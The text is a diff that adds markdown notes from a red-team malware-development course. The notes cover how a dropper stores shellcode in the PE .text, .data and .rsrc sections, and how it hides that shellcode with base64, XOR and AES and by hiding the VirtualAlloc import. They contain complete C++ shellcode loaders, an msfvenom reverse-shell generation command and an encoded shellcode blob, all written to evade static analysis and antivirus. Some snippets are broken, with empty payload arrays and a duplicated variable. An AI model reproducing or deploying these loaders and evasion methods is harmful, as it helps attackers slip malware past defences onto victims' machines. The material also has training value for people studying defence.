@@ -1,0 +1,718 @@
+### PE Files structure
+- We can see the structure of a lot of files in the [**Corkami Project**](https://github.com/corkami/pics/blob/master/binary/README.md) one of them is the [PE File Format](https://github.com/corkami/pics/blob/master/binary/pe101/pe101l.png) 
+- View sections of PE file:
+    - **PE BEAR** 
+    - **dumpbin**
+        ```powershell copy filename="CMD"
+        dumpbin /headers file.exe
+        ```
+- View exports of a DLL
+    ```powershell copy filename="CMD"
+    dumpbin /exports file.dll
+    ```
+- **EXE** vs **DLL**
+    - **EXE**:
+        - Is an independet PE file that can be loaded into memory as an independent process.
+        - Has as `main()` function (the entry point) that gets called by the **OS loader** when it finishes initializing the process to start executing our code.
+    - **DLL**:
+        - Dynamic loaded library, is a PE file that can be loaded into a running process's memory.
+        - Has a `DllMain()` function ( the standard entry point of a DLL ) that gets called by the **OS Loader**. this function initializes the DLL module then the **OS loader** hands back the execution to the main process that loaded this DLL so It can call the functions it needs from that DLL.
+        - Must has at least 1 exported function
+        - To run a DLL natively, we need some sort of a host process to load it. and `rundll32.exe` in Microsoft Windows allows us to do so 
+            ```powershell copy filename="CMD"
+                # Run DLL 
+                rundll32.exe .\file.dll,exported_function
+            ```
+
+### Payload Storage
+- A dropper is a program that its main function is to deliver and execute our malicious code.
+- We can store the malicious code in 1 of the 3 parts of the dropper PE file:
+#### .text secion  
+        contains the executable code of the PE. so in order to store the payload into the **.txt section** part we need to store it as **local varaible** of a **function**   
+##### Example
+    ```cpp copy filename="dropper.cpp" showLineNumbers  {14-19,25, 33}  /PAGE_READWRITE/ /PAGE_EXECUTE_READ/ 
+        #include <windows.h>
+        #include <stdio.h>
+        #include <stdlib.h>
+        #include <string.h>
+
+        int main(void) {
+            
+            void * exec_mem;
+            BOOL rv;
+            HANDLE th;
+            DWORD oldprotect = 0;
+
+            // 4 byte payload
+            unsigned char payload[] = {
+                0x90,		// NOP
+                0x90,		// NOP
+                0xcc,		// INT3, Its a software breakpoint instruction
+                0xc3		// RET
+            };
+            unsigned int payload_len = 4;
+            
+            // Allocate a memory buffer for payload
+            // Notice we made this memory RW not RWX as a kind of evasion
+            // will be converted to RX prior execution
+            exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
+            printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
+
+            // Copy payload to new buffer
+            RtlMoveMemory(exec_mem, payload, payload_len);
+            
+            // Make new buffer as executable
+            rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+
+            printf("\nHit me!\n");
+            getchar();
+
+            // If all good, run the payload
+            if ( rv != 0 ) {
+                    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
+                    WaitForSingleObject(th, -1);
+            }
+
+            return 0;
+        }
+
+    ```
+##### Example Analysis
+- These are the 2 addresses printed our by the **implant.exe**
+    ```powershell filename="CMD >"
+    C:\Users\hacker\Desktop\RTO-maldev hide01.ir\RTO\02.Payload_Storage hide01.ir\01.implant.text>.\implant.exe
+    payload addr         : 0x0000000581AFF760
+    exec_mem addr        : 0x0000012210A70000
+
+    Hit me!
+    ```
+- Searching for our payload in the process memory we'll find 3 occurences
+![mal-dev](/images/mal-dev-3.png)
+- The first address is in the following memory region which corresponds to a thread stack for thread **`1780`** which is the main thread of this process, meaning that our payload that we stored in the **local variable** is stored now in the stack of the main thread of the app.
+![mal-dev](/images/mal-dev.png)
+- The second address where our payload appeared is in following memory region, notice the initial and the current permissions on this memory region to know that It was originally `RW` and then changed to `ER` `execute-read` as we did in the code 
+![mal-dev](/images/mal-dev-1.png)
+- The third address is in the `.text` section in the executable file itself that was loaded into process memory.
+![mal-dev](/images/mal-dev-2.png)
+#### .data secion:   
+Contains data used during the execution of the PE, like **global variables**, so in order to store the payload  into the **.data section** we need to store it in something like a **global variable**
+##### Example
+```cpp copy filename="implant.cpp" showLineNumbers {15-20}
+/*
+
+ Red Team Operator course code template
+ storing payload in .data section
+ 
+ author: reenz0h (twitter: @sektor7net)
+
+*/
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+// 4 byte payload
+unsigned char payload[] = {
+	0x90,		// NOP
+	0x90,		// NOP
+	0xcc,		// INT3
+	0xc3		// RET
+};
+unsigned int payload_len = 4;
+
+int main(void) {
+    
+	void * exec_mem;
+	BOOL rv;
+	HANDLE th;
+    DWORD oldprotect = 0;
+
+	// Allocate a memory buffer for payload
+	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
+	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
+
+	// Copy payload to new buffer
+	RtlMoveMemory(exec_mem, payload, payload_len);
+
+	// Make new buffer as executable
+	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+
+	printf("\nHit me!\n");
+	getchar();
+
+	// If all good, run the payload
+	if ( rv != 0 ) {
+			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
+			WaitForSingleObject(th, -1);
+	}
+
+	return 0;
+}
+
+``` 
+
+##### Example Analysis
+- By executing the exe, and analyzing it the same ways as the last example, we'll find the 2 addresses of the payload as printed in the terminal
+```bash copy filename="CMD >"
+C:\Users\hacker\Desktop\RTO-maldev hide01.ir\RTO\02.Payload_Storage hide01.ir\02.implant.data>.\implant.exe
+payload addr         : 0x00007FF68382D000
+exec_mem addr        : 0x0000025F70250000
+
+Hit me!
+```
+- The second one as we see resides in the **`.data`** section 
+![mal-dev](/images/mal-dev-4.png)
+
+#### **.rsrc section**:   
+Contains resouce files, so in order to store our payload in **.rsrc** section we need to store it in a file and refer to it  with in the code.
+##### Example
+```cpp copy filename="implant.cpp" showLineNumbers {27-31}
+/*
+
+ Red Team Operator course code template
+ storing payload in .rsrc section
+ 
+ author: reenz0h (twitter: @sektor7net)
+
+*/
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include "resources.h"
+
+int main(void) {
+    
+	void * exec_mem;
+	BOOL rv;
+	HANDLE th;
+    DWORD oldprotect = 0;
+	HGLOBAL resHandle = NULL;
+	HRSRC res;
+	
+	unsigned char * payload;
+	unsigned int payload_len;
+	
+	// Extract payload from resources section
+	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
+	resHandle = LoadResource(NULL, res);
+	payload = (char *) LockResource(resHandle);
+	payload_len = SizeofResource(NULL, res);
+	
+	// Allocate some memory buffer for payload
+	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
+	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
+
+	// Copy payload to new memory buffer
+	RtlMoveMemory(exec_mem, payload, payload_len);
+	
+	// Make the buffer executable
+	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+
+	printf("\nHit me!\n");
+	getchar();
+
+	// Launch the payload
+	if ( rv != 0 ) {
+			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
+			WaitForSingleObject(th, -1);
+	}
+
+	return 0;
+}
+
+```
+##### Example Analysis
+As shown in the **implant.exe** terminal the 2 addresses of the payload
+```powershell filename="CMD >"
+C:\Users\hacker\Desktop\RTO-maldev hide01.ir\RTO\02.Payload_Storage hide01.ir\03.implant.rsrc>.\implant.exe
+payload addr         : 0x00007FF7D6051060
+exec_mem addr        : 0x000001BC8DDB0000
+
+Hit me!
+```
+By tracking the first address, we'll notice that It resides in the `.rsrc` section of the **implant.exe** file
+![mal-dev](/images/mal-dev-5.png)
+In the soruce code, we can notice the `#include <resources.h>` 
+The `resources.h` file just contains the `FAVICON_ICO` definition
+![mal-dev](/images/mal-dev-7.png)
+And `FAVICON_ICO` itself is defined in `resource.rc` file,
+![mal-dev](/images/mal-dev-8.png)
+which is an `RCDATA` datatype and its value is  stored in `calc.ico`
+![mal-dev](/images/mal-dev-9.png)
+In the `compile.bat` we'll find that the `.res` file is being converted to a `.o` file first before being linked to the `implant.exe` during the compilation
+![mal-dev](/images/mal-dev-6.png)
+
+### Payload Obfuscation
+#### Payload Encoding
+- Lets generate a metasploit reverseshell with **msfvenom**
+```bash copy filename="Bash >" 
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.48.128 LPORT=80 -f raw > payload.bin
+```
+- Base64 encode our  payload
+```bash copy filename="Bash > "
+cat payload.bin | base64 | tr -d '\n'
+```
+- And this is our final code for **implant.cpp**
+```cpp copy filename="implant.cpp" showLineNumbers {16, 50}
+/*
+
+ Red Team Operator course code template
+ payload encoding with base64
+
+ author: reenz0h (twitter: @sektor7net)
+
+*/
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <Wincrypt.h>
+#pragma comment (lib, "Crypt32.lib")
+
+unsigned char calc_payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAABQwKgwgEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInCSP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbqZpXRh/9VIgcRAAgAASbhjbWQAAAAAAEFQQVBIieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1Q==";
+unsigned int calc_len = sizeof(calc_payload);
+
+
+int DecodeBase64( const BYTE * src, unsigned int srcLen, char * dst, unsigned int dstLen ) {
+
+	DWORD outLen;
+	BOOL fRet;
+
+	outLen = dstLen;
+	fRet = CryptStringToBinary( (LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE * )dst, &outLen, NULL, NULL);
+	
+	if (!fRet) outLen = 0;  // failed
+	
+	return( outLen );
+}
+
+
+int main(void) {
+    
+	void * exec_mem;
+	BOOL rv;
+	HANDLE th;
+    DWORD oldprotect = 0;
+	
+	// Allocate new memory buffer for payload
+	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
+	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
+
+	printf("\nHit me 1st!\n");
+	getchar();
+
+	// Decode the payload back to binary form
+	DecodeBase64((const BYTE *)calc_payload, calc_len, (char *) exec_mem, calc_len);
+	
+	// Make the buffer executable
+	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);
+
+	printf("\nHit me 2nd!\n");
+	getchar();
+
+	// If all good, execute!
+	if ( rv != 0 ) {
+			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
+			WaitForSingleObject(th, -1);
+	}
+
+	return 0;
+}
+
+```
+#### Payload Encryption XOR
+The same as encoding, but instead, we'll be using an encrypted payload, and decrypt it just prior the execution phase to avoid static Analysis
+```python copy filename="xorencrypt.py" showLineNumbers {10-21}
+# Red Team Operator course code template
+# payload encryption with XOR
+#
+# author: reenz0h (twitter: @sektor7net)
+
+import sys
+
+KEY = "mysecretkeee"
+
+def xor(data, key):
+	
+	key = str(key)
+	l = len(key)
+	output_str = ""
+
+	for i in range(len(data)):
+		current = data[i]
+		current_key = key[i % len(key)]
+		output_str += chr(ord(current) ^ ord(current_key))
+	
+	return output_str
+
+def printCiphertext(ciphertext):
+	print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
+
+
+
+try:
+    plaintext = open(sys.argv[1], "rb").read()
+except:
+    print("File argument needed! %s <raw payload file>" % sys.argv[0])
+    sys.exit()
+
+
+ciphertext = xor(plaintext, KEY)
+print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
+
+```
+
+```cpp copy filename="implant.cpp" showLineNumbers {15-25, 34, 36, 46,47}
+/*
+
+ Red Team Operator course code template
+ payload encryption with XOR
+ 
+ author: reenz0h (twitter: @sektor7net)
+
+*/
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+
+void XOR(char * data, size_t data_len, char * key, size_t key_len) {
+	int j;
+	
+	j = 0;
+	for (int i = 0; i < data_len; i++) {
+		if (j == key_len - 1) j = 0;
+
+		data[i] = data[i] ^ key[j];
+		j++;
+	}
+}
+
+int main(void) {
+    
+	void * exec_mem;
+	BOOL rv;
+	HANDLE th;
+    DWORD oldprotect = 0;
+
+	unsigned char calc_payload[] = 
+	unsigned int calc_len = sizeof(calc_payload);
+	char key[] = "mysecretkeee";
+
+	// Allocate a buffer for payload
+	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
+	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
+
+	printf("\nHit me 1st!\n");
+	getchar();
+
+	// Decrypt (DeXOR) the payload
+	XOR((char *) calc_payload, calc_len, key, sizeof(key));
+	
+	// Copy the payload to allocated buffer
+	RtlMoveMemory(exec_mem, calc_payload, calc_len);
+	
+	// Make the buffer executable
+	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);
+
+	printf("\nHit me 2nd!\n");
+	getchar();
+
+	// If all good, launch the payload
+	if ( rv != 0 ) {
+			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
+			WaitForSingleObject(th, -1);
+	}
+
+	return 0;
+}
+
+```
+#### Payload Encryption AES 
+```python filename="aesencrypt.py" copy showLineNumbers
+# Red Team Operator course code template
+# payload encryption with AES
+# 
+# author: reenz0h (twitter: @sektor7net)
+
+import sys
+from Crypto.Cipher import AES
+from os import urandom
+import hashlib
+
+KEY = urandom(16)
+
+def pad(s):
+	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
+
+def aesenc(plaintext, key):
+
+	k = hashlib.sha256(key).digest()
+	iv = 16 * '\x00'
+	plaintext = pad(plaintext)
+	cipher = AES.new(k, AES.MODE_CBC, iv)
+
+	return cipher.encrypt(bytes(plaintext))
+
+
+try:
+    plaintext = open(sys.argv[1], "r").read()
+except:
+    print("File argument needed! %s <raw payload file>" % sys.argv[0])
+    sys.exit()
+
+ciphertext = aesenc(plaintext, KEY)
+print('AESkey[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
+print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
+
+```
+```cpp filename="implant.cpp" copy showLineNumbers
+/*
+
+ Red Team Operator course code template
+ payload encryption with AES
+ 
+ author: reenz0h (twitter: @sektor7net)
+
+*/
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <wincrypt.h>
+#pragma comment (lib, "crypt32.lib")
+#pragma comment (lib, "advapi32")
+#include <psapi.h>
+
+
+int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
+        HCRYPTPROV hProv;
+        HCRYPTHASH hHash;
+        HCRYPTKEY hKey;
+
+        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
+                return -1;
+        }
+        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
+                return -1;
+        }
+        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
+                return -1;              
+        }
+        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
+                return -1;
+        }
+        
+        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
+                return -1;
+        }
+        
+        CryptReleaseContext(hProv, 0);
+        CryptDestroyHash(hHash);
+        CryptDestroyKey(hKey);
+        
+        return 0;
+}
+
+
+int main(void) {
+    
+	void * exec_mem;
+	BOOL rv;
+	HANDLE th;
+    DWORD oldprotect = 0;
+
+	unsigned char key[] = 
+	unsigned char calc_payload[] = 
+	unsigned int calc_len = sizeof(calc_payload);
+	
+	// Allocate memory for payload
+	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
+	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
+
+	printf("\nHit me 1st!\n");
+	getchar();
+
+	// Decrypt payload
+	AESDecrypt((char *) calc_payload, calc_len, key, sizeof(key));
+	
+	// Copy payload to allocated buffer
+	RtlMoveMemory(exec_mem, calc_payload, calc_len);
+	
+	// Make the buffer executable
+	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);
+
+	printf("\nHit me 2nd!\n");
+	getchar();
+
+	// If all good, launch the payload
+	if ( rv != 0 ) {
+			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
+			WaitForSingleObject(th, -1);
+	}
+
+	return 0;
+}
+
+```
+
+### Function Call Obfuscation
+- The external **DLLs** used by a binary and the names of the functions within them can be a good indicator that a file is malicious or not, this can be done by analyzing the **IAT** (Import Address Table) section
+
+- We can analyze the **IAT** easily with
+```powershell copy filename="CMD >"
+dumpbin /imports .\implant.exe 
+```
+- Getting rid of `VirtualAlloc()`
+![mal-dev](/images/mal-dev-10.png)
+
+##### Example
+```cpp filename="implant.cpp" copy showLineNumbers {82, 91}
+/*
+
+ Red Team Operator course code template
+ function call obfuscation
+ 
+ author: reenz0h (twitter: @sektor7net)
+
+*/
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#pragma comment (lib, "crypt32.lib")
+#pragma comment (lib, "advapi32")
+#include <psapi.h>
+
+LPVOID (WINAPI * vap)( LPVOID lpAddress, SIZE_T dwSize,  DWORD  flAllocationType, DWORD  flProtect);
+
+unsigned char calc_payload[] = {
+  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
+  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
+  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
+  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
+  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
+  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
+  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
+  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
+  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
+  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
+  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
+  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
+  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
+  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
+  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
+  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
+  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
+  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
+  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
+  0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
+  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
+  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
+  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
+};
+unsigned int calc_len = sizeof(calc_payload);
+unsigned char key[] = {0x41, 0x58, 0x41, 0x58, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48};
+unsigned char enc_va[] ={0xC4, 0x35, 0x68, 0x73, 0xA8, 0x87, 0xD3, 0x51, 0xCE, 0x45, 0xCE, 0x52, 0xCD, 0x6B, 0x59, 0x90};
+unsigned int enc_va_length = sizeof(enc_va);
+
+
+int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
+        HCRYPTPROV hProv;
+        HCRYPTHASH hHash;
+        HCRYPTKEY hKey;
+
+        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
+                return -1;
+        }
+        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
+                return -1;
+        }
+        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
+                return -1;              
+        }
+        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
+                return -1;
+        }
+        
+        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
+                return -1;
+        }
+        
+        CryptReleaseContext(hProv, 0);
+        CryptDestroyHash(hHash);
+        CryptDestroyKey(hKey);
+        
+        return 0;
+}
+
+int main(void) {
+    
+	// Make the vap pointer point at our method inside kernel32.dll
+	// vap = GetProcAddress(GetModuleHandle("kernel32.dll"),"VirtualAlloc");  //this is before encrypting VirtualAlloc
+	//Decrypt our method_name
+	AESDecrypt((char *) enc_va, enc_va_length, key, sizeof(key));
+	
+	// Unpadding the enc_va in a stupid but valid  way ^_^
+	unsigned char first12[12];
+	for(int i = 0; i < 12; i++) {
+        first12[i] = enc_va[i];
+    }
+	vap = GetProcAddress(GetModuleHandle("kernel32.dll"),first12);
+	void * exec_mem;
+	BOOL rv;
+	HANDLE th;
+    DWORD oldprotect = 0;
+	char key[] = "";
+
+	// Allocate buffer for payload
+	exec_mem = vap(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
+	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
+
+	//XOR((char *) calc_payload, calc_len, key, sizeof(key));
+
+	// Copy payload to the buffer
+	// Decrypt payload
+	
+	RtlMoveMemory(exec_mem, calc_payload, calc_len);
+	
+	// Make the buffer executable
+	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);
+
+	printf("\nHit me!\n");
+	getchar();
+
+	// If all good, run the payload
+	if ( rv != 0 ) {
+			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
+			WaitForSingleObject(th, -1);
+	}
+
+	return 0;
+}
+
+```
+
+Now our **IAT** doesn't containt `VirtualAlloc`
+![mal-dev](/images/mal-dev-11.png)
+but its still in the strings 
+![mal-dev](/images/mal-dev-12.png)
+- But, we can encrypt that string so that It doesn't appear in memory
+- Lets select any random string from the output of `strings.exe` on the binary to cause more confusion `AXAX^YZAXAYAZH`
+- We can use this simple method to convert the strings into a **C format** string
+```python copy filename="printC.py" showLineNumbers
+def printC(string):
+    hex_array = ', '.join(['0x{:02X}'.format(ord(char)) for char in string])
+    print("[{}]".format(hex_array))
+```
+Notice, there is not `VirtualAlloc()` in strings output  this time
+![mal-dev](/images/mal-dev-13.png)
